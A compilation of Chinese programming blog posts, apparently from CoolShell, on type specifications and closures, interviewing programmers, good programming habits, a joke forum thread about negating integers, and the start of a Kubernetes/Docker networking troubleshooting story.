也就是说只要是满足Pair类型规范，即定义了make_pair，get_left, get_right这3种操作，并且这些操作满足上面两个不变式，那么它这就是Pair类型。我们再来看看稍微复杂一点的Stack类型：Type Stack:     Operations:     Stack make_stack()  //构造空栈     Stack push(Stack stack, int x)  //将元素x压栈，返回新栈     int top(stack)  //获取栈顶元素     Stack pop(Stack stack)  //将栈顶元素弹栈，返回新栈     Invariants:     top(push(stack, x)) == x  //栈顶元素为最后一次压栈值     pop(push(stack, x)) == stack  //对stack压栈后再弹栈等于原来的stackStack类型规范简言之就是FILO（先入后出），如果要形式化就是上面的不变式。为了加深理解，我们现在切换到测试视角来看一看，如果请你来编写一个Stack类的单元测试用例，你应该怎么写呢？许多朋友都不清楚单元测试到底测什么？怎么测？我见过不少人用一个测试用例单独对push做测试，用另一个测试用例对pop单独做测试，其主要原因就在于缺乏对类型本质的理解。其实，只要理解了类型的本质我们就知道孤立地看push或pop是没有任何意义的，它们的意义是在FILO关系下相互解释的，所以测试当然是基于类型规范来测试FILO不变式！这种基于类型规范的测试是一种黑盒测试，与类型的内部实现细节无关，只要单元测试覆盖了类型所定义的所有操作和不变式，那么不管内部怎么实现或优化，测试用例都不需要调整。反之，如果深入到了类型的内部实现做白盒测试，那这样的测试用例实际上就不再是反映其类型规范了，它会随着实现细节的调整而失效。
更深一层来看，不仅是在Pair，Stack这样的微观层面，在一个系统的宏观层面同样可以采用类型视角，即考察系统定义了哪些操作？这些操作之间有什么样的关系或不变式？比如，你如何从类型的角度来看待MySQL这样一套数据库系统？MySQL系统定义了哪些操作？这些操作之间必须满足怎样的关系和不变式？不仅如此，类型视角除了可以应用于计算机系统，甚至还可以应用于生活中的事物，比如，你到超市购物可以寄存自己的包，在寄包的时候会获得一张密码条，取包时可以通过密码条打开箱子。你能从超市寄包这个例子中看出类型来吗？如果你看出来了，说明你对类型的理解真正融会贯通了！#### 类型的函数式实现上面我们介绍了类型的本质在于操作和操作间的关系，下面我们要关注的是类型的实现。在上面的例子中，Pair的内部结构到底是什么，是一个left和一个right成员？还是一个两元素的数组？没有讲，也没关系，就好像Windows的Handle和Linux的FileDescriptor一样，它们都是一个标识，你并不需要关心它的值本身，你只需要用几个相关的函数创建和操作它就行了（上面超市寄包例子中的密码条和Windows中的Handle是什么关系，你看出来了吗？你需要理解密码条的内容吗？）。换句话说，只要满足类型规范，具体实现是可变的，使用者 **只依赖于类型规范而不依赖于其具体实现** 。这在面向对象语言中意味着接口保持不变而具体实现可以变化（这里把public方法视为一种广义的接口）。
下面，我们还会看到的是不仅类型的内部实现可以变化，而且可以根本没有什么所谓的内部实现。这是什么意思呢？让我们来思考一下，是不是Pair内部一定要有什么东西来保存构造函数传入的left和right？我们能跳出这个定势吗？在函数式编程中，我们能做到：[javascript]   //Javascript   function make_pair(x, y) {   // 返回一个支持get_left和get_right操作的闭包(Closure)   return {   get_left : function() { return x },   get_right : function() { return y }   }   }   function get_left(pair) {   return pair.get_left();   }   function get_right(pair) {   return pair.get_right();   }   // Test case   console.log(get_left(make_pair(1, 2))) //1   console.log(get_right(make_pair(1, 2))) //2   [/javascript]
上面的关键代码在于make_pair的内部返回的不是一种具体的数据结构，而是一个支持get_left和get_right操作的闭包(Closure)，将来可以通过get_left和get_right来提取x, y。这种基于闭包的实现和我们通常采用的基于数据结构的实现的本质区别在哪里呢？不难发现， **基于闭包的实现和类型规范是直接对应的** ，它并没有引入类型规范之外的东西，而基于数据结构的实现则隐藏了实现的细节。换句话说，如果要验证实现代码的正确性，对于前者只需要比对着类型规范，对于后者我们可能需要去仔细理解推敲其所采用的数据结构。对于Pair这样简单的结构二者差别不大，甚至基于数据结构的实现更简单，但是对于复杂的类型就容易体现出闭包实现的优势了。为了加深理解，我们再来看一个Stack的函数式实现：上面的所有函数都是采用了无副作用的纯函数式设计，可能习惯面向对象编程的朋友不是很习惯，不过这不影响我们对类型的讨论，而且它也很容易改造成面向对象的风格，感兴趣的朋友可以自己尝试对上面的代码进行简单的包装让它看起来像面向对象的样子。#### 函数式二叉树迭代器上面我们介绍了类型的本质和函数式实现，下面我们再来看看Iterator类型又该如何定义和实现呢？ 思路当然还是从操作入手，考虑Iterator类型对应了哪些操作，它们的关系是什么？上面九瓜提示了Iterator类型可以抽象为线性表List类型，或者说Iterator本质上是一个List。为什么呢？其实，只要跳出“如何表示数据结构”的思维，从类型角度思考就很容易理解，因为Iterator和List都定义了相同的操作，Iterator的使用者完全不关心也不知道它背后到底是链表还是二叉树，你对Iterator的操作和一个List的操作完全一样。正是这个原因，STL等范型库才能通过Iterator将算法和数据结构解耦。
怎么定义一个List类型呢？九瓜提到的empty(), singleton()和append()实际上就是和List打交道最多的Lisp语言的经典定义方式。Lisp是基于s- expression的，s-expression既可以视为线性表又可以视为树，本质上Lisp为List类型了构造、取首元素和取剩余元素等几种操作：Type List:     Operations:     List empty()  //构造空表，通常由()这个文字量表示     List singleton(Element e)  //构造包含一个元素的表，通常由(e)这个文字量表示     Element first(List list)   //取list的第一个元素，通常又叫car操作     List rest(List list)  //取list除第一个元素外的剩余部分，通常又叫cdr操作     List append(List list1, List list2) //连接两个表     Invariants:     append(empty(), list) == list  //空表和表list连接后等于表list     append(list, empty()) == list  //空表和表list连接后等于表list     first(singleton(e)) == e  //对singleton(e)取首元素等于e     rest(singleton(e)) == empty()  //对singleton(e)取首元素外的剩余部分的结果为空表     append(first(list), rest(list)) == list  //对list的首尾两部分进行连接等于list本身     if list1 is not empty then     first(append(list1, list2)) == first(list1)  //对非空表list1于表list2的连接取首元素等于对非空表list1取首元素     if list1 is not empty then     rest(append(list1, list2)) == append(rest(list1), list2)  //对非空表list1于表list2的连接取首元素等于对非空表list1取首元素
有了上面的分析，我们相应地写出下面的List实现：在此基础上可以进一步实现二叉树迭代器：上面的make_binary_tree_iterator在List类型的基础上按照二叉树遍历过程构造了一个List。不知道你是否注意到了，为什么它不像下面这个例子一样直接返回一个List，而要构造一个闭包呢？这里关键的区别在于闭包是惰性求值的，也就是说只有当真正开始迭代遍历的时候才会逐渐对各个函数进行求值，而上面的函数递归调用是非惰性的，会从一开始就把所有结点展开成线性表。如果你对这一点还不能很好地理解，可以尝试在各个函数中加log跟踪函数的调用过程。#### 总结本文介绍了类型的本质在于它所定义的操作以及操作之间的关系和不变式。类型的实现关键在于满足类型规范的要求，而具体实现是可以变化的，使用者和测试用例都应该只依赖于类型规范而不依赖于具体实现。函数式的类型实现往往和类型规范是直接对应的，简单通用，但可能有性能问题，而命令式的类型实现往往会引入复杂的内部数据结构，但是其优点是高效。这两种实现并不是完全互斥的，有时候可以将二者相结合达到简单与高效的结合。# 再谈“我是怎么招聘程序员的”（上）作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cn我以前写过一篇“我是怎么招聘程序员的”的文章（在CSDN那里有很多人进行了回复）。今天，我想再谈谈关于招聘和面试这方面的东西，主要是以下这些原因：* 近半年来我在进行了大量的招聘工作，对面试有一些新的体会。   * 酷壳最近发布了几篇趣味面试题（面试题一，面试题二，面试题三），从回复中让我有一些思考。   * 我有一个同事最近面试了一家公司，他和我分享了一个博士专家对他的面试，也让我思考了一些。   * 在豆瓣上看到“知乎上某人写面试豆瓣产品经理的经历，很欢乐”(亮点是面试官现身知乎亲自作答)所以，我很想把自己的这些新的想法再次写下来的。还是和以前一样，这篇文章同样是献给面试官的。我认为，面试的好坏完全在面试官而不是面试的人。下面是我对“我是怎么招聘程序员的”一文中的一些加强性的观点。（关于一些点评，请参看本文下篇）为了让我的文章有连续性，请允许我重申一下前文的几个重要观点。* **只有应聘者真实和自然的表现，才能了解到最真实的东西**   * **重要的不是知识，重要的是其查找知识的能力**   * **重要的不是那个解题的答案，而是解题的思路和方法**
#### 操作，知识，经验，能力我们有很多的面试官似乎分不清，什么是操作能力，什么是知识，什么是经验，什么是能力，这导致了我们的面试官经常错误地对面试者下结论，我认为分不清这些事的人是没有资格做面试官的。所以，我有必要在这里把这个问题先讲清楚。* **操作** 。我们的面试官分不清楚什么是操作技能，什么是知识，他们甚至认为操作技能就是知识甚至经验。比如他们会 问如下的问题，请问Java中的 final是什么意思？怎么查看进程的CPU利用率？怎么编写一个管道程序？怎么查看进程的程序路径？VI中的拷贝粘贴命令是什么？包括面向对象的XX模 式是什么。等等。我以为， **这些能够通过查况相关操作手册或是能够google到的东西只能说明这个人的操作技术，并不能说明他有知识或有经验** 。* **知识** 。知识是一个人认知和学习的体现，可能会是一些基础概念和知识。比如这些问题：TCP和UDP的优缺点比 较，链表和哈希表的优缺点的比较。什么是堆什么是栈？进程间是怎么通信的？进程和线程的优缺点？同步和异步的优缺点？面向对象的XX设计模式的主要原则是 什么，等等。我以为， **“知其然”只是操作技术，“知其所以然”才是真正的知识** 。知识不够并不代表他不能工作，会操作技能就可以应付工作，但是知识的欠缺一定会限制你的经验和能力，同样会影响你的开发质量。
* **经验** 。经验通常跟一个人的经历有关系。一个人的知识范围，一个人经历过的事，通常会成为一个人经验的体现。面 试中，我们会问这些问题：你解决过最难的问题是什么？你是怎么设计这个系统的？你是怎么调试和测试你的程序的？你是怎么做性能调优的？什么样的代码是好的 代码？等等。对于工作年限不长的人来说，经历和做过的事的确会成为其经验的主要因素，尤其是业务上的有行业背景的东西。但是，我更以为， **经验可能更多的是你对知识的运用和驾驭，是你对做过事情的反思和总结，是你对他人的学习，观察和交流** 。* **能力** 。一个人的能力并不会因为知道东西少而不行，也不会因为没有经验而没有能力。 **一个人的能力是他做事情的一种态度，性格，想法，思路，行为，方法和风格** 。 **只要有热情，有想法，有好的行为方法，以及好的行事风格，那么知识和经验对他来说只是一个时间问题** 。 比如：学习能力，专研精神，分析能力，沟通能力，组织能力，问题调查能力，合作能力等等。所以，对于一个新手来说，也许他的知识和经验有限，但并不代表他 能力上有问题，但是对于一个老手来说，如果其存在知识和经验欠缺的问题，那么通常都是其能力的问题。你可能暂时怀才不遇，但我不相信你会长期怀才不遇。如 果是的话，那么你必然些问题其让你的能力发挥不出来。而此时，“没有经历过”只会是你“没有能力”的一个借口。
我不否认这四样东西对于一个优秀的程序员来说都很重要。但是，通过上述的分析，我们可以知道，能力和经验和知识需要分开对待。当然，这些东西是相辅相成的，你的能力可以让你获得知识，你的知识可以让你更有经验，你的经验又会改变你的想法和思路，从而改善你的能力。 **在面试中，我们需要清楚的认识到，应聘者的操作技能，知识和经验只是其能力的必要条件，并不是充要条件，而我们更应该关注于应聘者的能力** 。* 如果面试只是考查这个人的操作技能的话，那么这个面试完全失败。这是一个没有资格的面试官。   * 如果面试只是在考查这个人的知识和经验的话，那么成功了一半。因为你了解了基础知和做过的事，但这并不代表你完全了解他的真正能力。   * 如果你能够在了解这个人的知识和经验的过程中重点关注其能力（态度、性格、想法，思路，行为，方法和风格），并能正确地评估这个人的能力，那么你的面试算是非常成功的。也许用这四个词来描述定套东西并不太合适，但我相信你明白我想表达的。另外，我想说的是， **我们不是出个题来考倒应聘者，而是要找到应聘者的亮点和长处** 。#### 不要肤浅地认识算法题和智力题很多公司都会在面试的时候给一些算法题或是一些智力题或是一些设计题，我相信算法题或是智力题是程序员们在面试过程中最反感的事了。很多人都很BS面试官问的算法题，因为他们认为面试官问的这些算法题或智力题在实际工作当中用不到。但我想在这里说， **问难的算法智力题并没有错，错的很多面试官只是在肤浅甚至错误地理解着面试中的难题的目的** 。他们认为，能做出算法题和智力题的人就是聪明的人就是有能力的人，这种想法实在是相当的肤浅。
其实，能解难题并不意味着这个人就有能力就能在工作中解决问题，你可以想想，小学奥数题可能比这些题更难，但并不意味着那些奥数能手就有实际工作能力。你可 以想一想你们班考试得高分的同学并不一定就是聪明的人，也不一定就是有能力的人，相反，这样的人往往者是在应试教育下培养出来的书呆子。所以，我认为解难题的过程更重要，你要主要是通过解题查看这个应聘者的思路，方法，运用到的知识，有没有一些经验，和你一起交互时和沟通得是否顺畅，等等，这些才是你重点要去观察的。当然，最终是要找到答案的。我想，让面试者解决一个难题的真正思路是：* **看看他对知识的应用和理解** 。比如，他是否会用一些基础的数据结构和算法来解决算法题？   * **看看他的整个解题思路和想法** 。答案是次要的，他的想法和行为才是重要的。   * **看看他是如何和你讨论交流的** 。把面试者当成你未来的同事，当成你的工作伙伴，一起解题，一起讨论，这样可以看看大家是否可以在一起工作。这些方面才是考查应聘者的能力（思路，方法、态度，性格等），并顺带着考查面试者的经验和知识。下面是一些面试的点：* 应聘者在解算法题时会不会分解或简化这个难题。这是分析能力。   * 应聘者在解算法题 时会不会使用一些基础知识，如数据结构和基础算法。这是知识。   * 应聘者在解题 时和你讨论的过程中你有没有感到应聘者的专研精神和良好的沟通。   * 应聘者在对待这个算法题的心态和态度。如，面试面是否有畏难情绪。   * 应聘者在解题时的思路和方法是否得当，是否是比较科学的方法？   * 等等。
**在解难题 的过程中考查应聘者的能力才是最终目的，而不是为难应聘者，不然，你只是一个傲慢而无知的面试官** 。#### 模拟实际中的挑战和能力作为面试官的你，你应该多想想你的工作，以及你的成长经历。这会对你的面试很有帮助。你在工作中解决问题的实际情况是什么？你写代码的实际情况是什么？你的成长经历是什么？你是怎么获得知识和能力的？你喜欢和什么样的人工作？ **相信你不难会发现你工作中的实际情况和面试的情况完全是两码事，那么，你怎么可以用这种与实际情况差别那么大的面试来评估一个人的能力呢** ？所以，最为理想的面试是一起工作一段时间。当然，这个在招聘过程中，操作起来几乎不可能，因此，这就要求我们的面试官尽可能地把面试的过程模拟成平时工作的 过程。大家一些讨论来解决一个难题，和应聘者一起回顾一下他已经做过的事情，并在回础的过程中相互讨论相互学习。下面举一个例子。我们知道，对于软件开发来说，开发软件不难，难是的下面是这些挑战：1. 软件的维护成本远远大于软件的开发成本。   2. 软件的质量变得越来越重要，所以，测试工作也变得越来越重要。   3. 软件的需求总是在变的，软件的需求总是一点一点往上加的。   4. 程序中大量的代码都是在处理一些错误的或是不正常的流程。
所 以，当我们在考查应聘者的代码能力时候，我们为什么不能模拟这样的过程呢？比如，让应聘者实现一个atoi()的函数，实现起来应该很简单，然后 不断地往上加新的需求或新的案例，比如：处理符号，处理非数字的字母的情况，处理有空格的情况，处理十六进制，处理二进制，处理“逗号”，等等，我们要看 应聘者是怎么修改他的代码的，怎么写测试案例的，怎么重构的，随着要处理的东西越来越多，他的代码是否还是那么易读和清晰。如果只是考查编码能力，一个小时，就问这一个问题，足矣。真正的程序员每天都在和这样的事打交道的。如果要考查应聘者的设计能力，同样可以如法泡制。不断地加新的功 能，新的需求。看看面试者的思路，想法，分 析的方法，和你的讨论是否流畅，说没说在 点上，思想清不清晰，会应用什么样的知识，他在设计这个系统时的经验是会是什么样的，面对不断的修改和越来越复杂的需求，他的设计是否还是那么好？当然，因为时间比较短，所以，你不能出太复杂的问题，这需要你精心设计一些精制的有代表性的问题。（末完，请参看下篇）**再谈“我是怎么招聘程序员的”（下） >>>****（请勿用于商业用途，转载时请注明作者和出处）**# 优秀程序员的十个习惯
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在这个世界上，有数百万的人热衷于软件开发，他们有很多名字，如：软件工程师（Software Engineer），程序员（Programmer），编码人（Coder），开发人员（Developer）。经过一段时间后，这些人也许能够成为一个优秀的编码人员，他们会非常熟悉如何用计算机语言来完成自己的工作。但是，如果你要成为一个优秀的程序员，你还可以需要有几件事你需要注意，如果你能让下面十个条目成为你的习惯，那么你才能真正算得上是优秀程序员。1\. **学无止境** 。就算是你有了10年以上的程序员经历，你也得要使劲地学习，因为你在计算机这个充满一创造力的领域，每天都会有很多很多的新事物出现。你需要跟上时代的步伐。你需要去了解新的程序语言，以及了解正在发展中的程序语言，以及一些编程框架。还需要去阅读一些业内的新闻，并到一些热门的社区去参与在线的讨论，这样你才能明白和了解整个软件开发的趋势。在国内，一些著名的社区例如：CSDN，ITPUB，CHINAUINX等等，在国外，建议你经常上一上digg.com去看看各种BLOG的聚合。
2\. **掌握多种语言** 。程序语言总是有其最适合的领域。当你面对需要解决的问题时，你需要找到一个最适合的语言来解决这些问题。比如，如果你需要性能，可能C/C++是首选，如果你需要跨平台，可能Java是首选，如果你要写一个Web上的开发程序，那么PHP，ASP，Ajax，JSP可能会是你的选择，如果你要处理一些文本并和别的应用交互，可能Perl, Python会是最好的。所以，花一些时间去探索一下其它你并熟悉的程序语言，能让你的眼界变宽，因为你被武装得更好，你思考问题也就更为全面，这对于自己和项目都会有好的帮助。3\. **理性面对不同的操作系统或技术** 。程序员们总是有自己心目中无可比拟的技术和操作系统，有的人喜欢Ubuntu，有的人喜欢Debian，还有的人喜欢Windows，以及FreeBSD，MacOSX或Solaris等等。看看我的BLOG()中的那篇《其实Unix很简单》后的回复你就知道程序员们在维护起自己的忠爱时的那份执着了。只有一部分优秀的程序员明白不同操作系统的优势和长处和短处，这样，在系统选型的时候，才能做到真正的客观和公正，而不会让情绪影响到自己。同样，语言也是一样，有太多的程序员总是喜欢纠缠于语言的对比，如：Java和Perl。哪个刚刚出道的程序员没有争论去类似的话题呢？比如VC++和Delphi等等。争论这些东西只能表明自己的肤浅和浮燥。优秀的程序并不会执着于这些，而是能够理性的分析和理心地面对，从而才能客观地做出正确的选择。
4\. **别把自己框在单一的开发环境中。** 再一次，正如上面所述，每个程序员都有自己忠爱的工具和技术，有的喜欢老的（比如我就喜欢Vi编辑程序），而有的喜欢新的比如gedit或是Emacs等。有的喜欢使用像VC++一样的图形界面的调试器，而我更喜欢GDB命令行方面的调式器。等等等等。程序员在使用什么样的工具上的争论还少吗？到处都是啊。使用什么样的工具本来无所谓，只要你能更好更快地达到你的目的。但是有一点是优秀程序员都应该了解的——那就是应该去尝试一下别的工作环境。没有比较，你永远不知道谁好谁不好，你也永远不知道你所不知道的。5\. **使用版本管理工具管理你的代码。** 千万不要告诉我你不知道源码的版本管理，如果你的团队开发的源代码并没有版本管理系统，那么我要告诉你，你的软件开发还处于石器时代。赶快使用一个版式本管理工具吧。CVS 是一个看上去平淡无奇的版本工具，但它是被使用最广的版本管理系统，Subversion 是CVS的一个升级版，其正在开始接管CVS的领地。Git 又是一个不同的版本管理工具。还有Visual SourceSafe等。使用什么样的版本管理工具依赖于你的团队的大小和地理分布，你也许正在使用最有效率或最没有效率的工具来管理你的源代码。但一个优秀的程序员总是会使用一款源码版本管理工具来管理自己的代码。如果你要我推荐一个，我推荐你使用开源的Subversion。
6\. **是一个优秀的团队成员。** 除非你喜欢独奏，除非你是孤胆英雄。但我想告诉你，今天，可能没有一个成熟的软件是你一个人能做的到的，你可能是你团队中最牛的大拿，但这并不意味着你就是好的团队成员。你的能力只有放到一个团队中才能施展开来。你在和你的团队成员交流中有礼貌吗？你是否经常和他们沟通，并且大家都喜欢和你在一起讨论问题？想一想一个足球队吧，你是这个队中好的成员吗？当别人看到你在场上的跑动时，当别人看到你的传球和接球和抢断时，你的团员成员能因为你的动作受到鼓舞吗？7\. **把你的工作变成文档。** 这一条目当然包括了在代码中写注释，但那还仅仅不够，你还需要做得更多。有良好的注释风格的代码是一个文档的基础，他能够让你和你的团队容易的明白你的意图和想法。写下文档，并不仅仅是怕我们忘了当时的想法，而且还是一种团队的离线交流的方法，更是一种知识传递的方法。记录下你所知道的一切会是一个好的习惯。因为，我相信你不希望别人总是在你最忙的时候来打断你问问题，或是你在休假的时候接到公司的电话来询问你问题。而你自己如果老是守着自己的东西，其结果只可能是让你自己长时间地深陷在这块东西内，而你就更本不可以去做更多的事情。包括向上的晋升。你可能以为“教会徒弟能饿死师父”，但我告诉你，你的保守会让你失去更多更好的东西，请你相信我，我绝不是在这里耸人听闻。
8\. **注意备份和安全。** 可能你觉得这是一个“废话”，你已明白了备份的重要性。但是，我还是要在这里提出，丢失东西是我们人生中的一部份，你总是会丢东西，这点你永远无法避免。比如：你的笔记本电脑被人偷了，你的硬盘损坏了，你的电脑中病毒了，你的系统被人入侵了，甚至整个大楼被烧了，等等，等等。所以，做好备份工作是非常非常重要的事情，硬盘是不可信的，所以定期的刻录光盘或是磁带可能会是一个好的方法，网络也是不可信的，所以小心病毒和黑客，不但使用软件方面的安全策略，你更需要一个健全的管理制度。此外，尽量的让你的数据放在不同的地方，并做好定期（每日，每周，每月）的备份策略。9\. **设计要足够灵活。** 可能你的需求只会要求你实现一个死的东西，但是，你作为一个优秀的程序，你应该随时在思考这个死的东西是否可以有灵活的一面，比如把一些参数变成可以配置的，把一些公用的东西形成你的函数库以便以后重用，是否提供插件方面的功能？你的模块是否要以像积木一样随意组合？如果要有修改的话，你的设计是否能够马上应付？当然，灵活的设计可能并不是要你去重新发明轮子，你应该尽可能是使用标准化的东西。所谓灵话的设计就是要让让考虑更多需求之外的东西，把需求中这一类的问题都考虑到，而不是只处理需求中所说的那一特定的东西。比如说，需要需要的屏幕分辨率是800×600，那么你的设计能否灵活于其他的分辨率？程序设计总是需要我们去处理不同的环境，以及未来的趋势。我们需要用动态的眼光去思考问题，而不是刻舟求剑。也许有一天，你今天写的程序就要移植到别的环境中去，那个时候你就能真正明白什么是灵活的设计了。
10\. **不要搬起石头砸自己的脚。** 程序员总是有一种不好的习惯，那就是总是想赶快地完成自己手上的工作。但情况却往往事已愿违。越是想做得快，就越是容易出问题，越是想做得快，就越是容易遗漏问题，最终，程序改过来改过去，按下葫芦起了瓢，最后花费的时间和精力反而更多。欲速而不达。优秀程序员的习惯是前面多花一些时间多作一些调查，试验一下不同的解决方案，如果时间允许，一个好的习惯是，每4个小时的编程，需要一个小时的休息，然后又是4个小时的编码。当然，这因人而异，但其目的就是让你时常回头看看，让你想一想这样三个问题：1）是否这么做是对的？2）是否这么做考虑到了所有的情况？3）是否有更好的方法？想好了再说，时常回头看看走过的路，时常总结一下过去事，会对你有很大的帮助。以上是十条优秀程序员的习惯或行为规范，希望其可以对你有所帮助。本文来源于网上phil的BLOG，但我在写作过程中使用了自己的语言和方法重新描述了一下这十条，所以，我希望你在转载的时候能够注明作者和出处以表示对我的尊重。谢谢！文章：来源# 编程真难啊作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
上周，在Sun的Java论坛上出现了一个这样的帖子，这个贴子的链接如下：   http://forums.sun.com/thread.jspa?threadID=5404590&start=0&tstart=0LZ的贴子翻译如下：> > 大家好，我是一个Java的新手，我有一个简单的问题：请问我怎么才能反转一个整数的符号啊。比如把-12转成+12。是的，毫无疑问这是个简单的问题，但我弄了一整天我也找不到什么好的方法。非常感谢如果你能告诉我Java有什么方法可以做到这个事，或者告诉我一个正确的方向——比如使用一些数学库或是二进制方法什么的。谢谢！这个贴子的沙发给出了答案：n = -n;LZ在四楼回复到：> 我知道是个很简单的事，可我没有想到居然这么简单，我觉得你可能是对的。谢谢你。过了一会，又回复到：> 不开玩笑地说，我试了，真的没有问题耶！看到这样的贴子，就能想到国内论坛上很多这样的“问弱智问题的贴子”，结果可能都会是比较惨！是的，国外的互联网文化和国内差不多，都是恶搞的人多于热心的人，呵呵。 **不过，国外的网民们有一点是好的，再恶搞也是就事搞事，不会有侮辱人的语言，这点真是值国内的人学习** 。
这本是一个平淡无奇的贴子，不过回复中那些恶搞的“解决方案”太强大了，在这里例举一下吧。贴子的板凳给出了这样的答案（这是恶搞的开始）然后，有人说，n = -n 可以是可以，但不够晦涩，于是一个晦涩的解决方案出现了：int n = ....;     n = (0xffffffff ^ n) + 1;然后，又出现了一些看似简单，其实是比较晦涩的方案``n = ~n + 1; `````````n = ~--n; `````````````继续，有才的人从来就不少：````````n^= 0xffffffff;     int m;     for (m= 1; m != 0 && ((n&m) != 0); m<<= 1);     n|= m;     if (m == 0) n= m;     else for (m >>= 1; m != 0; n^= m, m>>=1);````````呵呵，开始越来越强大了，我以前也向大家介绍过《如何加密/弄乱C源代码》的文章，和这些恶搞的人可能有点相似吧。上面这个例子一出，大家都在讨论上面例子中的for循环语句，呵呵，很费解啊。````然后，后面几个就开始乱来了：``
不过事情还没有结束，看看下面这个吧，OMG。还有用字符串的解决方案：return Integer.parseInt(nStr);     }别忘了面象对象，有最新Java支持的模板库：protected abstract String negateValueAsString ();     }这个贴子基本上就是两页，好像不算太严重，如果你这样想的话，你就大错特错了。这个贴子被人转到了reddit.com，于是一发不可收拾，在上面的回贴达到了490多条。链接如下：有人说，要用try catch；有人说要使用XML配置文件……，程序员们在追逐更为变态和疯狂的东西，并从中找到快乐，呵呵。看完后，正如reddit.com所说——“ **编程好难啊** ”！无独有偶，这并不是第一次，也不会是最后一次，让我们看看在PHP的官网上发生的类似的一幕——讨论PHP的abs取绝对值函数的函数说明文档中的回复：又是一个长贴，还带着很多性能分析，真的很好很强大！（全文完）# 记一次Kubernetes/Docker网络排障作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
昨天周五晚上，临下班的时候，用户给我们报了一个比较怪异的Kubernetes集群下的网络不能正常访问的问题，让我们帮助查看一下，我们从下午5点半左右一直跟进到晚上十点左右，在远程不能访问用户机器只能远程遥控用户的情况找到了的问题。这个问题比较有意思，我个人觉得其中的调查用到的的命令以及排障的一些方法可以分享一下，所以写下了这篇文章。目录* 问题的症状   * 问题的排查     * 问题初查     * 重新梳理     * 柳暗花明   * 总结   * 问题原因   * 其它事宜#### 问题的症状用户直接在微信里说，他们发现在Kuberbnetes下的某个pod被重启了几百次甚至上千次，于是开启调查这个pod，发现上面的服务时而能够访问，时而不能访问，也就是有一定概率不能访问，不知道是什么原因。而且并不是所有的pod出问题，而只是特定的一两个pod出了网络访问的问题。用户说这个pod运行着Java程序，为了排除是Java的问题，用户用 `docker exec -it` 命令直接到容器内启了一个 Python的 SimpleHttpServer来测试发现也是一样的问题。我们大概知道用户的集群是这样的版本，Kuberbnetes 是1.7，网络用的是flannel的gw模式，Docker版本未知，操作系统CentOS 7.4，直接在物理机上跑docker，物理的配置很高，512GB内存，若干CPU核，上面运行着几百个Docker容器。
#### 问题的排查##### 问题初查首先，我们排除了flannel的问题，因为整个集群的网络通信都正常，只有特定的某一两个pod有问题。而用 `telnet ip port` 的命令手工测试网络连接时有很大的概率出现 `connection refused` 错误，大约 1/4的概率，而3/4的情况下是可以正常连接的。当时，我们让用户抓个包看看，然后，用户抓到了有问题的TCP连接是收到了 `SYN` 后，立即返回了 `RST, ACK`我问一下用户这两个IP所在的位置，知道了，`10.233.14.129` 是 `docker0`，`10.233.14.145` 是容器内的IP。所以，这基本上可以排除了所有和kubernets或是flannel的问题，这就是本地的Docker上的网络的问题。对于这样被直接 Reset 的情况，在 `telnet` 上会显示 `connection refused` 的错误信息，对于我个人的经验，这种 `SYN`完直接返回 `RST, ACK`的情况只会有三种情况：1. TCP链接不能建立，不能建立连接的原因基本上是标识一条TCP链接的那五元组不能完成，绝大多数情况都是服务端没有相关的端口号。   2. TCP链接建错误，有可能是因为修改了一些TCP参数，尤其是那些默认是关闭的参数，因为这些参数会导致TCP协议不完整。   3. 有防火墙iptables的设置，其中有 `REJECT` 规则。
因为当时还在开车，在等红灯的时候，我感觉到有点像 NAT 的网络中服务端开启了 `tcp_tw_recycle` 和 `tcp_tw_reuse` 的症况（详细参看《TCP的那些事（上）》），所以，让用户查看了一上TCP参数，发现用户一个TCP的参数都没有改，全是默认的，于是我们排除了TCP参数的问题。然后，我也不觉得容器内还会设置上iptables，而且如果有那就是100%的问题，不会时好时坏。所以，我怀疑容器内的端口号没有侦听上，但是马上又好了，这可能会是应用的问题。于是我让用户那边看一下，应用的日志，并用 `kublet describe`看一下运行的情况，并把宿主机的 iptables 看一下。然而，我们发现并没有任何的问题。这时， **我们失去了所有的调查线索，感觉不能继续下去了……**##### 重新梳理这个时候，回到家，大家吃完饭，和用户通了一个电话，把所有的细节再重新梳理了一遍，这个时候，用户提供了一个比较关键的信息—— “ **抓包这个事，在`docker0` 上可以抓到，然而到了容器内抓不到容器返回 `RST, ACK` **” ！然而，根据我的知识，我知道在 `docker0` 和容器内的 `veth` 网卡上，中间再也没有什么网络设备了（参看《Docker基础技术：LINUX NAMESPACE（下）》）!
于是这个事把我们逼到了最后一种情况 —— IP地址冲突了！Linux下看IP地址冲突还不是一件比较简单事的，而在用户的生产环境下没有办法安装一些其它的命令，所以只能用已有的命令，这个时候，我们发现用户的机器上有 `arping` 于是我们用这个命令来检测有没有冲突的IP地址。使用了下面的命令：$ arping -D -I docker0 -c 2 10.233.14.145     $ echo $?根据文档，`-D` 参数是检测IP地址冲突模式，如果这个命令的退状态是 `0` 那么就有冲突。结果返回了 `1` 。而且，我们用 `arping` IP的时候，没有发现不同的mac地址。 **这个时候，似乎问题的线索又断了** 。因为客户那边还在处理一些别的事情，所以，我们在时断时续的情况下工作，而还一些工作都需要用户完成，所以，进展有点缓慢，但是也给我们一些时间思考问题。##### 柳暗花明现在我们知道，IP冲突的可能性是非常大的，但是我们找不出来是和谁的IP冲突了。而且，我们知道只要把这台机器重启一下，问题一定就解决掉了，但是我们觉得这并不是解决问题的方式，因为重启机器可以暂时的解决掉到这个问题，而如果我们不知道这个问题怎么发生的，那么未来这个问题还会再来。而重启线上机器这个成本太高了。
